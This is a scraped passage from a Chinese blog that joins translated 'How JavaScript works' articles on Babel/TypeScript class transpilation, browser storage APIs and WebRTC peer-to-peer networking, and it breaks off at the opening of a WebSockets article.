开发者社区就迫不及待想要引擎和浏览器实现支持。一种好的实现方法即通过代码转换。它允许使用 ECMAScript 2015 来进行代码编写然后转换为任何浏览器均可以运行的 JavaScript 代码。这包括使用基于类的继承来编写类并转换为可执行代码。 Babel 是最为流行的转译器之一。让我们通过 babel 转换 component 类来了解代码转换原理。 123456789101112class Component { constructor(content) { this.content = content; } render() { console.log(this.content) }}const component = new Component('SessionStack');component.render(); 以下为 Babel 是如何转换类定义的： 12345678910111213141516var Component = function () { function Component(content) { _classCallCheck(this, Component); this.content = content; } _createClass(Component, [{ key: 'render', value: function render() { console.log(this.content); } }]); return Component;}(); 如你所见，代码被转换为可在任意环境中运行的 ECMAScript 5 代码。另外，引入了额外的函数。它们是 Babel 标准库的一部分。编译后的文件中引入了 _classCallCheck 和 _createClass 函数。第一个函数保证构造函数永远不会被当成普通函数调用。这是通过检查函数执行上下文是否为一个 Component 对象实例来实现的。代码检查 this 是否指向这样的实例。第二个函数 _createClass 通过传入包含键和值的对象数组来创建对象(类)的属性。 为了理解继承的工作原理，让我们分析一下继承自 Component 类的 InputField 子类。 123456class InputField extends Component { constructor(value) { const content = `&lt;input type=\"text\" value=\"${value}\" /&gt;`; super(content); }} 这里是使用 Babel 来处理以上示例的输出： 123456789101112var InputField = function (_Component) { _inherits(InputField, _Component); function InputField(value) { _classCallCheck(this, InputField); var content = '&lt;input type=\"text\" value=\"' + value + '\" /&gt;'; return _possibleConstructorReturn(this, (InputField.__proto__ || Object.getPrototypeOf(InputField)).call(this, content)); } return InputField;}(Component); 本例中，在 _inherits 函数中封装了继承逻辑。它执行了前面所说的一样的操作即设置子类的原型为父类的实例。 为了转译代码，Babel 执行了几次转换。首先，解析 ES6 代码并转化成被称为抽象语法树的中间展示层，抽象语法树在前一章有讲过了。该树会被转换为一个不同的抽象语法树，该树上每个节点会转换为对应的 ECMAScript 5 节点。最后，把抽象语法树转换为 ES5 代码。 Babel 中的抽象语法树AST 由节点组成，每个节点只有一个父节点。Babel 中有一种基础类型节点。该节点包含节点的内容及在代码中的位置的信息。有各种不同类型的节点比如字面量表示字符串，数值，空值等等。也有控制流(if) 和 循环(for, while)的语句节点。另外，还有一种特殊类型的类节点。它是基础节点类的子类，通过添加字段变量来存储基础类的引用和把类的正文作为单独的节点来拓展自身。 转化以下代码片段为抽象语法树： 123456789class Component { constructor(content) { this.content = content; } render() { console.log(this.content) }} 以下为该代码片段的抽象语法树的大概情况： 创建抽象语法树后，每个节点转换为其对应的 ECMAScript 5 节点然后转化为遵循 ECMAScript 5 标准规范的代码。这是通过寻找离根节点最远的节点然后转换为代码。然后，他们的父节点通过使用每个子节点生成的代码片段来转化为代码，依次类推。该过程被称为 depth-first traversal 即深度优先遍历。 以上示例，首先生成两个 MethodDefinition 节点，之后类正文节点的代码，最后是 ClassDeclaration 节点的代码。 使用 TypeScript 转译TypeScript 是另一个使用转译的流行框架。它引入了一种编写 JavaScript 程序的新语法，然后转换为任意浏览器或引擎可以运行的 EMCAScript 5 代码。以下为使用 Typescript 实现 component 类的代码： 123456789class Component { content: string; constructor(content: string) { this.content = content; } render() { console.log(this.content) }} 以下为抽象语法树示意图： 同样支持继承。 123456class InputField extends Component { constructor(value: string) { const content = `&lt;input type=\"text\" value=\"${value}\" /&gt;`; super(content); }} 代码转换结果如下： 12345678910var InputField = /** @class */ (function (_super) { __extends(InputField, _super); function InputField(value) { var _this = this; var content = \"&lt;input type=\\\"text\\\" value=\\\"\" + value + \"\\\" /&gt;\"; _this = _super.call(this, content) || this; return _this; } return InputField;}(Component)); 最后结果包含了一些来自 TypeScript 的类库代码。__extends 中封装了和之前第一部分讨论的一样的继承逻辑。 随着 Babel 和 TypeScript 的广泛使用，标准类和基于类的继承渐渐成为组织 JavaScript 程序的标准方式。这就推动了浏览器原生支持类。 类的原生支持2014 年，Chrome 原生支持类。这就可以不使用任意库或者转换器来实现声明类的语法。 类的原生实现的过程即被称为语法糖的过程。这只是一个优雅的语法可以被转换为语言早已支持的相同的原语。使用新的易用的类定义，归根结底也是要创建构造函数和修改原型。 V8 引擎支持情况让我们了解下 V8 是如何原生支持 ES6 类的。首先解析新语法为可运行的 JavaScript 代码并添加到 AST 树中。类定义的结果即在抽象语法树中添加一个 ClassLiteral 类型的新节点。 该节点包含了一些信息。首先，它把构造函数当成单独的函数且包含类属性集。这些属性可以是一个方法，一个 getter, 一个 setter, 一个公共变量或者私有变量。该节点还储存了指向父类的指针引用，该父类也并储存了构造函数，属性集和及父类引用，依次类推。 一旦把新的 ClassLiteral 转换为字节码，再将其转化为各种函数和原型。","link":"/posts/7d7cd34b.html"},{"title":"存储引擎及如何选择合适存储API","text":"How JavaScript works: Storage engines + how to choose the proper storage API 原文请查阅这里，略有删减。 概述当你设计网页程序时，为本地设备选择合适的存储机制尤为重要。一个好的存储引擎可以更可靠地存储数据，减少带宽及提高程序的响应速度。正确的存储缓存策略是构建移动端离线网页体验的核心，越来越多的用户认为默认情况下应该如此。 本章中，我们将讨论各种存储 API 和服务，并提供一些在构建网页程序时如何正确地选择存储引擎的建议。 数据模型数据存储模型决定了内部是如何组织存储数据的。这会影响到整个网页程序的设计，更使你的网页程序具备高效率且足够解决其所遇到的问题之间的平衡。没有所谓更好的方法或通用的解决方案，因为所有的问题都是工程相关。那么，让我们来看下可供选择的数据模型吧： 结构型：以预定义字段将数据存储于表中，因其为典型的基于 SQL 的数据库管理系统，所以可以很好适应灵活和动态的数据查询。IndexedDB 即浏览器结构化数据存储的一个典型例子。 键/值型：键/值数据存储及关系型 NoSQL 数据库，允许开发者通过唯一键索引来存储和获取非结构型数据(即非预定数据类型的字段的数据)。键/值数据存储就像哈希表存储，允许在平均时间复杂度O(1)内访问索引的不定数据类型的数据。键/值数据型存储的很好的例子有浏览器端的 Cache API 和 服务器端 Apache Cassandra。 字节流型：这一简单的模型把数据存储为定长，混淆字符串的字节变量，让应用层来控制其内部数据组织。该模型尤其适合于文件存储和其它层次型组织的 blob 数据。字节流存储的典型例子包括文件系统和云存储设备。 持久性可以根据使数据持久化的时间范围来分析Web应用程序的存储方法： 会话持久性：仅当活动的单个网页会话或者浏览器选项卡时数据有效，关闭即失效。会话持久性数据存储一个例子即 Session Storage API。 设备持久性：该类数据存储于一个特定设备的跨会话和浏览器选项卡/窗口有效。设备持久性存储机制的一个例子即 Cache API。 全局持久性：该类数据跨会话和设备存储。因此，它是兼容性最好的数据持久性方案。它不会存储于设备上，这意味着需要从服务端存储中获得数据。因为这里只讨论针对设备的数据存储，所以这里只是稍微提下服务端数据存储。 客户端数据持久性如今，有不少浏览器 API 可供选择用于存储数据。这里将详细讨论这些方法，然后进行比较以便开发者轻松地选择正确的数据存储方案。 首先在选择如何存储数据之前，开发者需要考虑几件事情 。当然了，第一件事即必须想清楚打算如何使用网页程序及之后的维护和性能优化。即使你已经有了答案，可选方案也只有几个。以下为开发者需要考虑的问题： 浏览器支持-优先考虑标准化和组织良好的 API，因为这些 API 不会轻易变动且兼容性好。这些 API 同样有丰富的文档和活跃的开发者社区。 事务-有时候，事务对于相关的数据存储操作集原子化成功或失败至关重要。传统数据库使用事务模型来实现该功能，在事务模型中把相关更新划分为任意的单元。 同步/异步-少数存储 API 是同步的意即存储或者检索数据请求会阻塞当前活跃线程直到数据请求结束。使用同步数据存储 API 会阻塞主线程且会让程序界面假死。尽量使用异步存储 API。 对比让我们浏览一下网页开发者当前可用的 API 并使用上述的几个维度来进行比较。 API Data Model Persistence Browser Support Transactions Sync/Async File system Byte stream device 52% No Async Local Storage key/value device 93% No Sync Session Storage key/value session 93% No Sync Cookies structured device 100% No Sync Cache key/value device 60% No Async IndexedDB hybrid device 83% Yes Async 文件系统 API 有了 FileSystem API，网页程序就可以在用户本地文件系统的沙箱中进行新建，读取，操作和写文件。 文件系统接口包含以下几部分： 读取和操作文件：File/Blob，FileList，FileReader 新建和写文件：Blob()，FileWriter 访问目录和文件系统：DirectoryReader，FileEntry/DirectoryEntry，LocalFileSystem 文件系统 API 不是标准的 API。因此兼容性不太好，所以切记不要在生产环境中使用。各种浏览器厂商的实现会有很大的不同且该 API 以后可能会变更。 文件和目录条目 API 接口文件系统用来表示一个文件系统。可从任意文件系统条目的 filesystem 属性中获取这些对象。少数浏览器提供了额外的 API 来创建和操作文件系统。 该接口不会授予开发者访问用户文件系统的权限。相反，开发者会在浏览器沙箱内获得一个虚拟磁盘。若想要获得用户的文件系统访问权限，可以采取诸如安装 Chrome 插件的方法获得。 请求文件系统网页程序可调用 window.requestFileSystem() 来访问沙箱文件系统。： 123// 注意: 该文件系统以 Google Chrome 12 为前缀The file system has been prefixed as of Google Chrome 12:window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;window.requestFileSystem(type, size, successCallback, opt_errorCallback) 第一次调用 requestFileSystem() 方法的时候会新建一个本地存储。需要注意的是该文件系统是沙箱型的，意味着网页程序不可以相互访到彼此的文件。 获得访问文件系统的权限后，开发者可以对文件和目录进行大部分常规文件系统操作。 与其它存储策略相比，FileSystem 完全不同，它旨在满足数据库不能很好地解决客户端存储的情况。通常，这都是用来处理大型二进制 blobs 文件或者和浏览器上下文之外的程序共享数据的程序。 以下为使用 FileSystem 的一些例子： 断点续传工具-当选择文件或者文件目录来上传的时候，会把文件复制进沙箱后一次上传一个分片。 电子游戏，音乐或者其它含有大量媒体文件的程序 具有离线访问或者本地缓存功能的音频/图片编辑器-数据 blobs 一般很庞大且可读写 离线视频播放器-需要下载大文件以供之后观看或者快速的寻轨-缓冲 离线网页邮件客户端-下载附件且进行本地存储 Local storagelocalStorage API 允许开发者访问 文档 源的 Storage 对象。存储数据在多个浏览器会话之间有效。localStorage 和 sessionStorage 类似，只不过存储在 localStorage 中的数据没有过期时间，而存储在 sessionStorage 中的数据会在页面会话结束时丢失-意即当关闭页面时即丢失。 无论是 localStorage 还是 sessionStorage 其数据只存储在特定的页面源中，所谓页面源包含协议，主机名和端口。 Session storagesessionStorage 属性允许开发者访问当前源的会话 Storage 对象。前面简述过，sessionStorage 和 localStorage 类似。唯一的区别即，存储在 localStorage 中的数据没有过期时间而 sessionStorage 中的数据会在页面会话结束时丢失。页面会话的时效为浏览器打开时且在页面重载和恢复时。在新的选项卡中打开新页面或者窗口会导致重新初始化一个新的会话，这与会话 cookies 的工作机制是不一样的。 请注意无论数据存储于 sessionStorage 还是 localStorage 都仅只在指定的页面源中有效。 Cookies所谓 cookie(网页 cookie，浏览器 cookie) 指的是由用户的服务器发送到客户端的一小段数据。浏览器将其存储下来然后在下一次请求的时候捎带上它发往服务器。典型地，它被用来告知两个请求是否来自于同一个客户端-比如保持用户登录状态。它为 无状态 HTTP 协议记录有状态信息。 Cookies 有以下三个主要使用场景： 会话管理-登录，购物车，游戏得分或者其它需要在服务端存储的数据。 个性化-用户偏好，皮肤和其它设置 监控-记录和分析用户行为 Cookies 曾经一统客户端存储方案。当它是客户端存储的唯一方案的时候，这是不二选择，如今也推荐选择使用现代存储 API 来存储客户端数据。每次发送请求都会带上 Cookies，所以会影响性能(特别是当在一个移动端请求数据的时候)。 有两种类型的 cookies： 会话 cookie-当用户关闭浏览器时失效。网页浏览器可以使用恢复会话技术来固化大多数会话 cookie，就好像未曾关闭浏览器一样。 永久性 cookie-和客户端关闭即过期相反，永久性 cookie 会在指定的过期时间过期或者在一个指定的时间(Max-age)后过期。 因其固有的不安全缺陷机制，请勿在 cookie 中存储凭据或者敏感信息，。 有一说一，cookie 是兼容性最好的方案。 CacheCache 接口是缓存请求/响应对象的存储机制。请注意和 workers 一样可在窗口作用域内使用 Cache 接口。虽然 Cache 是在 Service Workers 规范中定义的，但这并不表示一定要和 Service Workers 一起使用。 一个源可以拥有多个命名缓存对象。开发者只需要在脚本(比如在 Service Workers 中)中实现如何处理更新缓存即可。除非显示请求否则不会更新缓存中的对象，只能通过删除缓存对象，否则不会过期。使用 CacheStorage.open() 来打开指定命名的缓存对象，然后调用任意的缓存方法来维护缓存。 开发者需要定时清除缓存条目。每个源在浏览器上都有大小限额。使用 StorageEstimate 来估算使缓存配额使用率。浏览器尽力管理硬盘空间，但它有可能删除指定源的缓存数据。切记使用名称来对脚本进行版本控制且只操作可以安全操作的脚本版本。查看 Deleting old caches 以获取更多信息。 CacheStorage 接口表示 Cache 对象存储。 接口： 提供一个可以为 ServiceWorker，其它类型工作线程或者 window 作用域可访问的所有命名的缓存的主目录(虽然是在 Service Workers 中定义的缓存，但是并不意味着只能将其和工作线程配合使用) 维护一份字符名称和 Cache 对象的映射 使用 CacheStorage.open() 来创建 Cache 实例。 使用 CacheStorage.match() 来检查指定的 Request 是否是 CacheStorage 对象中的 Cache 对象的键。 使用通过全局 caches 属性来访问 CacheStorage。 IndexedDBIndexedDB 是一种客户端持久性数据存储方案。因其允许开发者创建拥有富查询能力的网页程序而不用关心网络情况，这些网页程序可以线上或者离线运行。 IndexedDB 适用于大量的数据存储(比如，借阅图书馆的DVD 目录)和不需要保持网络连通的网页程序(比如，邮件客户端，待办事项及便笺)。 因为其它存储 API大家都比较熟悉，我们将深入探究IndexedDB 的细节。另外，如今随着网页程序越来越复杂 IndexedDB 也正变得越来越流行。 IndexedDB 原理IndexedDB 允许开发者使用键来存储/获取一个对象。所有对数据库的操作均发生于事务之中。和其它网页存储方案一样，IndexedDB 遵循同源策略。因此，不能够跨域访问数据，只能访问同一个域名下的存储数据。 IndexedDB 属于异步 API, 可以在包括 网页服务线程 的大多数上下文上使用。IndexedDB 曾经也有 synchronous 版本，应用于网页线程中，但是由于社区对此并不感冒所以被从规范中删除了。 IndexedDB 曾经也有一个被称为 WebSQL 数据库的竞品规范，但是已经被 W3C 所弃用。虽然 IndexedDB 和 WebSQL 均是存储方案，但是它们功能并不一样。WebSQL 数据库是一个关系型数据库访问系统，而 IndexedDB 只是一个索引表系统。 不要以其它类型数据库为假象，想当然地使用 IndexedDB。相反，需要仔细阅读文档。以下为开发者所需要了解的核心概念： IndexedDB 数据库存储键-值对-值可以是复杂的结构型对象而键可以是这些对象的属性。开发者可以使用对象的任意属性来创建索引进行快速搜索，比如枚举排序。键也可以是二进制对象。 IndexedDB 基于事务型数据模型-IndexedDB 中的所有操作都发生于事务上下文之中。因此，开发者不可以在事务之外执行命令或者打开游标。同样地，事务只能自动而不可以手动提交。 *大多数 IndexedDB 都是异步的 *-API 不会通过返回值地形式来返回数据。相反，需要传入回调函数来处理返回值。意即，开发者不是同步把值存储进数据库或者直接从数据库中取回值。相反，发起 request 请求即表示一次数据库操作。当数据处理结束会通知开发者，开发者所监听的事件类型会通知数据操作是否成功。这和 XMLHttpRequest (或者其它这么多 JavaScript 相关的东西) 的工作原理大同小异。 IndexedDB 使用大量请求-请求是对象用来接收之前提到的成功或者失败事件。它们包含 onsuccess 和 onerror 属性，和 readyState，result，errorCode 等用来告知请求状态的属性一样。 IndexedDB 是面向对象的-IndexedDB 并不是一个含有表示行列集合的表关系型数据库。这一巨大的差异影响开发者设计和构建网页程序。 IndexedDB 不使用结构型查询语言(SQL)-它在索引上使用查询后会创建一个游标，可以使用该游标来遍历结果集。若不熟悉 NoSQL 系统，可以阅读 维基百科关于 NoSQL 的文章。 IndexedDB 也应用了同源策略-一个源即包含域名，应用程序层协议及 URL 端口地址的文档，脚本即在源中执行。每个源都拥有其关联的数据库集。每个数据库在源中都有唯一的标识。 IndexedDB 局限性IndexedDB 被设计用来满足大多数的客户端存储情况的。然而，它并没有被设计用来处理如下情况： 国际化排序-并不是所有的语言以同样的方式排列字符串，因此国际化排序是不支持的。虽然数据库并不能够以指定的国际化顺序来存储数据，开发者可以读取数据库中数据然后自行排列数据。 同步- API 并不是用来和服务端数据进行同步的。开发者必须自己写代码来把客户端 indexedDB 数据库和服务端数据库进行同步。 全文检索-该 API 中没有和 SQL 中的 LIKE 类似的操作符。 另外，要注意的是浏览器会在以下情况清除数据库： 用户发起清除操作的请求-许多浏览器都允许用户清除指定网站的数据，包括 cookie, 书签，存储的密码以及 IndexedDB 数据。 浏览器在隐私模式下-一些浏览器含有『隐私浏览』(Firefox) 和 『无痕浏览』(Chrome)模式。会话结束会清除数据库。 超出了磁盘容量或者磁盘限额。 数据损坏。。。 选择合适的存储 API正如之前所说的那样，最好尽可能采用兼容性好的 API 且提供异步调用模型来最大限度地提升 UI 响应速度。这些标准自然而然会产生如下技术选择： 使用 Cache API 来操作离线存储。该 API 在创建离线应用所必须的支持 Service Workers 功能的浏览器中可用。Cache API 非常适用于排列已知 URL 的关联资源。 使用 IndexedDB 来存储程序状态和用户生成的内容。和只支持 Cache API 的浏览器相比，这使得用户可以在更多的浏览器中离线使用程序。 参考 https://developers.google.com/web/fundamentals/instant-and-offline/web-storage/ https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Basic_Concepts_Behind_IndexedDB","link":"/posts/8296c979.html"},{"title":"WebRTC 及点对点网络通信机制","text":"How JavaScript works: WebRTC and the mechanics of peer to peer networking 原文请查阅这里，略有删减。 概述何为 WebRTC ？首先，RTC 即为实时通信技术。 WebRTC 填补了网络平台中的一个重要空白。以往，只有桌面聊天程序这样的 P2P 技术才能够实现实时通讯而网页不行。但是 WebRTC 的出现改变了这一状况。 WebRTC 本质上允许网页程序创建点对点通信，我们将在随后进行介绍。除此之外还会讨论如下主题，以便向开发者全面介绍 WebRTC 的内部构造： 点对点通信 防火墙和 NAT 穿透 信令，会话及协议 WebRTC 接口 点对点通信实现通过网页浏览器进行的点对点通信, 每个用户端浏览器必须按照如下步骤： 同意开始进行通信 知道如何定位对方 绕过安全和防火墙限制 实时传输所有多媒体通信信息 众所周知，基于浏览器的点对点通信的最大挑战之一即如何定位和建立与另一个网页浏览器进行通信的网络套接字连接以进行双向数据传输。我们将介绍建立与此种网络连接相关的困难。 当网页程序需要数据或者静态资源，会直接从相应的服务器获取，仅此而已。但是，如果想要通过直接连接用户的浏览器来建立点对点的视频聊天就不可能，因为其它浏览器并不是一个已知的网络服务器，所以用户不知道需要建立视频聊天的 IP 地址。所以，需要更多的技术以建立 p2p 连接。 防火墙和 NAT 穿透电脑一般不会分配到一个静态公共 IP 地址的。原因是电脑是位于防火墙和网络访问转换设备(NAT) 之后。 一个 NAT 设备会把防火墙内的私有 IP 地址转换为一个面向公共的 IP 地址。对于安全和有 IPv4 限制的可用公共 IP 地址来说，NAT 设备是必须的。这也是为什么开发者的网页程序不能够把当前设备看成拥有一个静态公共 IP 地址的原因。 让我们来了解下 NAT 设备的工作原理。当开发者处于公司网络中然后连上了 WIFI，那么电脑将会被分配一个只存在于 NAT 后面的 IP 地址。比如 172.0.23.4。然而，对于外部而言，用户的 IP 地址会是类似 164.53.27.98 这样的。那么，外部会把所有请求看作来自 164.53.27.98 而 NAT 设备会保证来自于目标用户电脑的请求的响应数据返回到相应的内部 172.0.23.4。这多亏了映射表。注意到除了 IP 地址，网络通信还需要通信端口。 随着 NAT 设备参与到此环节，浏览器需要知道进行通信的目标浏览器对应的机器 IP 地址。 这个就需要用到 NAT 会话穿透程序(STUN)和 NAT 穿透中继转发(TURN)服务器。为使用 WebRTC 技术，开发者需要请求 STUN 服务器以获得其公共 IP 地址。这就好像你的电脑请求远程服务器，询问远程服务器发起查询的客户端 IP 地址。远程服务器会返回对应的客户端 IP 地址。 如果过程顺利，那么开发者将会获得一面向公共的 IP 地址和端口，这样就可以告知其它点如何直接和你进行通信。同理，这些点也可以请求 STUN 或 TURN 服务器以获得公共 IP 地址然后告知其通信地址。 信令，会话和协议上述网络信息检索过程只是信令话题的一小部分，在 WebRTC 中，它是基于 JavaScript 会话构建协议(JSEP)标准的。信令涉及网络检索和 NAT 穿透，会话创建及管理，通信安全，媒体能力元数据和协调及错误处理。 为了使通信顺利进行，节点必须为元数据确定本地媒体环境(比如分辨率和编码能力等)和收集可用的程序主机网络地址。WebRTC 接口未集成反复传输这一重要信息的信令机制。 WebRTC 标准并没有规定信令且没有在接口中实现是为了能够更加灵活地使用其它技术和协议。信令和处理信令的服务器是由 WebRTC 程序开发者控制的。 假设开发者基于浏览器的 WebRTC 程序能够通过 STUN 服务器获取其公共 IP 地址，那么，下一步即和目标端进行协商和建立网络会话连接。 初始会话协商和建立是使用专用于多媒体通信的信令/通信协议进行的。该协议还负责管理会话和终止会话的规则。 会话初始协议(SIP) 是上述协议之一。由于 WebRTC 信令的灵活性，SIP 并不是唯一可供使用的信令协议。所选的通信协议必须和被称为会话描述协议(SDP)的应用层协议兼容，SDP 被应用于 WebRTC。所有的多媒体指定元数据都是通过 SDP 协议进行数据传输的。 任意试图和其它节点进行通信的节点(比如 WebRTC 程序)都会生成交互式连接建立协议(ICE)候选集。候选集表示一个可供使用的 IP 地址，端口及传输协议的集合。注意，一台电脑可以拥有多个网络接口(有线和无线等)，所以可以有多个 IP 地址，每个接口分配一个 IP 地址。 以下为 MDN 上描绘这一通信交换的图示： 建立连接每个节点首先获取之前所说的公共 IP 地址。之后动态创建「通道」(信令数据)来检索其它节点并且支持点对点协商及创建会话。 这些「通道」不能够被外部检索到且只能通过唯一标识符来访问。 需要注意的是由于 WebRTC 的灵活性且事实上信令创建程序并没有在标准中指定，使用的技术不同，「通道」的概念和使用会有些许异同。实际上某些协议并不要求「通道」机制来进行通信。 本篇文章我们将假定在实现中使用「通道」。 一旦两个或者更多节点连接到同一「通道」上，节点间就可以进行通信和协商会话信息。这一过程和发布/订阅模式有些许类似。大体上，初始节点使用会话初始协议(SIP)和 SDP 的信号协议发出一个「offer」的包。发起者等待连接到指定「通道」的接收者的「answer」应答。 一旦接收到应答，会开始选择和协商由各个节点生成的最优交互连接建立协调候选(ICE)集。一旦选定最优 ICE 候选集，特别是确认了所有节点通信所要求的元数据，网络路由(IP 地址和端口)及媒体信息。这样就会完全建立及激活节点间的网络套接字会话。紧接着，各个节点会创建本地数据流和数据通道端点，最后使用任意双向通信技术来传输多媒体数据。 如果确认最优 ICE 候选的过程失败了，经常发生于防火墙和 NAT 技术的使用后，会降级使用 TURN 服务器作为中继转发服务器。这一过程主要是使用一台服务器作为中间媒介，然后在节点间转发传输数据。请注意这不是真正的点对点通信，因为真正的点对点通信是节点之间直接进行双向数据传输。 每当使用 TURN 作为后备通信的时候，每个节点不必知道如何连接并传输数据给对方节点。相反，节点只需要知道在会话通信期间实时发送和接收多媒体数据的公共 TURN 服务器。 需要重点理解的是这只是一个失败保护和最后手段。TURN 服务器需要相当健壮，拥有昂贵带宽和强大的处理能力及处理潜在的大量数据。因此，使用 TURN 服务器会明显增加额外的开销和复杂度。 WebRTC 接口WebRTC 中包含三种主要接口： 媒体捕捉和流－允许开发者访问诸如麦克风和网络摄像机等输入设备。该接口允许开发者获取二者的媒体流。 RTCPeerConnection－开发者实时传输获取的视频和音频流到另一个 WebRTC 端点。使用这些接口可以连接本地机器和远程节点。该接口提供创建到远程节点的连接，维护和监视连接及关闭不活跃的连接的方法。 RTCDataChannel－该接口允许开发者传输任意数据。每个数据通道都和 RTCPeerConnection 有关。 我们将分别介绍这三类接口。 媒体捕捉和流媒体捕捉和流接口经常被称为媒体流接口或者流接口，该接口支持音视频流数据，处理它们的方法，与数据类型相关的约束，异步获取数据时的成功和错误回调及 API 调用过程中触发的事件。 MediaDevices 的 getUserMedia() 方法提示用户授权允许使用媒体输入设备，创建一个包含指定媒体类型轨道的媒体流。该媒体流，可包括诸如视频轨道(如摄像机，视频录制设备，屏幕共享服务等硬件或者虚拟视频源所创建)，音频轨道(与视频类似，由】麦克风，A/D 转换器等的物理或者虚拟音频源所创建)或其它类型。 该方法返回一个 Promise 并解析为 MediaStream 对象。当用户拒绝授权或者没有可用的匹配媒体资源，promise 会分别返回 PermissionDeniedError 或者 NotFoundError。 可以通过 navigator 对象访问 MediaDevice 单例： 1234567navigator.mediaDevices.getUserMedia(constraints).then(function(stream) { /* 使用流 */}).catch(function(err) { /* 处理错误 */}); 注意这里需要传入 constraints 对象以指定返回的媒体流类型。开发者可以进行各种配置，包括使用的摄像头(前置或后置)，帧频率，分辨率等。 从版本 25 起，基于 Chromium 的浏览器已经允许通过 getUserMedia() 获取的音频数据赋值给音频或者视频元素(但需要注意的是媒体元素默认为静音)。 可以把 getUserMedia作为网页音频接口的输入节点： 12345678910function gotStream(stream) { window.AudioContext = window.AudioContext || window.webkitAudioContext; var audioContext = new AudioContext(); // 从流创建音频节点 var mediaStreamSource = audioContext.createMediaStreamSource(stream); // 把它和目标节点进行连接来听你自己或由其它节点处理 mediaStreamSource.connect(audioContext.destination);}navigator.getUserMedia({audio:true}, gotStream); 隐私限制由于接口可能导致明显的隐私问题，规范在通知用户和权限管理方面对 getUserMedia() 方法有非常明确的规定。在打开诸如用户网页摄像头或者麦克风的媒体输入设备的时候getUserMedia() 必须总是获取用户的授权。 浏览器可能提供每个域名授权一次的权限功能，但必须至少要第一次询问授权，然后用户必须指定授权的权限。 通知规则同样重要。除了可能存在其它硬件指示器，浏览器还必须显示一个窗口显示使用中的摄像头或者麦克风。即使当时设备没有进行录制，浏览器必须显示一个提示窗口提示已授权使用哪个设备作为输入设备。 RTCPeerConnectionRTCPeerConnection 接口表示一个本地电脑和远程节点的 WebRTC 连接。它提供了连接远程节点，维护和监视连接及关闭不活跃连接的方法。 如下为一张 WebRTC 图表展示 了 RTCPeerConnection 的角色： 从 JavaScript 层面看 ，图中需要理解的主要方面即 RTCPeerConnection 把复杂的底层内部结构的复杂度抽象为一个接口给开发者。WebRTC 使用的编解码器和协议为即使在不稳定的网络环境下仍然能够创建一个尽可能实时的通信而做了大量的工作： 丢包隐藏 回波消除 带宽自适应 动态抖动缓冲 自动增益控制 降噪 图像「清洁」 RTCDataChannel不仅音视频，WebRTC 还支持实时传输其它类型的数据。 RTCDataChannel 接口允许点对点交换任意数据。 该接口有许多使用场景，包括： 游戏 实时文本聊天 文件传输 去中心网络 该接口有几项功能，充分利用了 RTCPeerConnection 并创建强大和灵活的点对点通信： 使用RTCPeerConnection 创建会话 包含优先级的多个并发通道 可靠和不可靠消息传递语义 内置安全(DTLS)和拥塞控制 语法和已有的 WebSocket 类似，包含了 send() 方法和 message 事件： 1234567891011121314151617var peerConnection = new webkitRTCPeerConnection(servers, {optional: [{RtpDataChannels: true}]});peerConnection.ondatachannel = function(event) { receiveChannel = event.channel; receiveChannel.onmessage = function(event){ document.querySelector(\"#receiver\").innerHTML = event.data; };};sendChannel = peerConnection.createDataChannel(\"sendDataChannel\", {reliable: false});document.querySelector(\"button#send\").onclick = function (){ var data = document.querySelector(\"textarea#send\").value; sendChannel.send(data);}; 由于通信是直接在浏览器之间进行的，所以 RTCDataChannel 会比 WebSocket 更快(即使使用中继转发服务器(TURN))。 WebRTC 实操在实际应用中，WebRTC 需要服务器，但这很简单，因此会发生如下步骤： 用户各自检索节点然后交换名字之类的详情。 WebRTC 客户端程序(点)交换网络信息。 节点交换视频格式和分辨率的媒体信息。 WebRTC 客户端程序穿透 NAT 网关 和防火墙。 换句话说，WebRTC 需要四种类型的服务端功能： 用户检索和通信 发送信号 NAT/防火墙穿透 中继转发服务器以防点对点通信失败 ICE 使用 STUN 协议及其扩展 TURN 协议来创建 RTCPeerConnection 连接来处理 NAT 穿透和其它网络变化。 如上，ICE 是用来连接两个视频聊天客户端的节点协议。一开始，ICE 会试图使用最低的可能的网络延迟即使用 UDP 来直接连接节点。在这一过程中，STUN 服务器只有一个任务:让位于 NAT 之后的节点能够找到其公共地址和端口。开发者可以查看一下可用的 STUN 服务器(Google 也有一堆) 名单。 检索连接候选若 UDP 连接失败，ICE 尝试 TCP:先 HTTP 后 HTTPS。如果直接连接失败-特殊情况下，由于企业 NAT 穿透和防火墙-ICE 使用中间(转发) TURN 服务器。换句话说，ICE 首先通过 UDP 使用 STUN 服务器来直接连接节点，若失败则后备使用 TURN 中继转发服务器。「检索连接候选者」指的是检索网络接口和端口的过程。 安全实时通信程序或插件可能造成几种安全问题。例如： 未加密媒体或者数据有可能会在浏览器之间或者浏览器和服务器之间被窃取。 程序有可能在未经用户授权同意的情况下记录和传播音视频。 可疑软件或者病毒有可能会随着无害插件或者程序一起安装。 WebRTC 有几种方法用来解决如上问题： WebRTC 实现使用诸如 DTLS 和 SRTP 的安全协议。 包括信令机制在内的所有 WebRTC 组件都强制加密。 WebRTC 不是一个插件：其组件运行于浏览器沙箱之中且不是在一个单独的进程之中，不需要单独安装组件且随着浏览器升级而更新。 摄像头和麦克风必须显式授权且当摄像头或者麦克风运行时，必须在用户界面明确显示。 对于需要实现浏览器间实时通信流功能的产品而言，WebRTC 是一个有趣和强大的技术。 参考资料： https://www.html5rocks.com/en/tutorials/webrtc/basics/ https://www.innoarchitech.com/what-is-webrtc-and-how-does-it-work/","link":"/posts/ee31fe07.html"},{"title":"深入理解WebSockets与带SSE机制的HTTP&#x2F;2","text":"How JavaScript works: Deep dive into WebSockets and HTTP/2 with SSE + how to pick the right path 原文请查阅这里，略有改动. 现在，我们将会深入通信协议的世界，绘制并讨论它们的特点和内部构造。我们提供一份 WebSockets 和 HTTP/2 的快速比较 。在文末，我们将分享如何正确地选择网络协议的相关见解。 简介如今复杂网页程序拥有丰富功能，动态UI，而这算不上稀奇－因为自互联网诞生，它已经走过很多年头。 起初，互联网并非用来支持如此动态和复杂的网页程序。本来设想是由大量 HTML 页面组成，每个页面能链接到其它页面，由此形成了包含信息的网页的概念。一切都是极大地围绕着所谓的 HTTP 请求/响应模式来建立的。客户端加载一个网页，直到用户点击页面并导航到下一个网页。 2005 年左右引入了 AJAX，随后很多人开始探索客户端和服务端双向通信的可能性。然而，所有的 HTTP 链接是由客户端控制的，意即必须由用户交互或者定期轮询以从服务器加载新数据。 HTTP “双向通信”支持服务器主动向客户端推送数据的技术已经出现有些时间了。比如 “Push“ 和 